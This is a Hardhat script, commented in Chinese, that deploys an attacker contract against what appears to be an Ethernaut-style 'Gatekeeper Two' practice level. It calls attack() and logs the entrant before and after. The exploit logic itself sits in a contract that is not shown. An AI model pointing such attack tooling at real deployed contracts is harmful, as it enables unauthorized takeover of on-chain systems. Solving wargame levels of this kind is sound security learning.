import hre from "hardhat";
const { ethers } = hre;

const CONTRACT_ADDRESS = "ADDR";

async function main() {
    const Contract = await ethers.getContractFactory("GatekeeperTwoGateTwoAttacker");
    const contract = await Contract.deploy(CONTRACT_ADDRESS);
    await contract.waitForDeployment();
      
    console.log("GatekeeperTwoGateTwoAttacker Contract deployed to: ", await contract.getAddress());

    // =========進攻開始===========
    const [signer] = await ethers.getSigners();
    console.log("我的帳戶地址 : ", signer.address);
    
    const gatekeeperTwoGateTwo = await ethers.getContractAt("GatekeeperTwoGateTwo", CONTRACT_ADDRESS);
    const GatekeeperTwoGateTwoAttacker = contract;

    console.log("gatekeeperTwoGateTwo 關卡實例地址: ", CONTRACT_ADDRESS);
    console.log("目前的 gatekeeperTwoGateTwo entrant: ", await gatekeeperTwoGateTwo.entrant());
    console.log("所使用的 gateKey : ", await GatekeeperTwoGateTwoAttacker.gateKey());

    try {
        console.log("發送交易... ");
        const tx = await GatekeeperTwoGateTwoAttacker.attack({ gasLimit: 10000000 });
        console.log("tx: ", tx);

        const receipt = await tx.wait();
        console.log("交易成功 receipt: ", receipt);
    } catch (error){
        console.log("error: ", error);
        console.log("Error message:", error.message);
    }

    console.log("攻擊後，目前的 gatekeeperTwoGateTwo entrant: ", await gatekeeperTwoGateTwo.entrant());

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });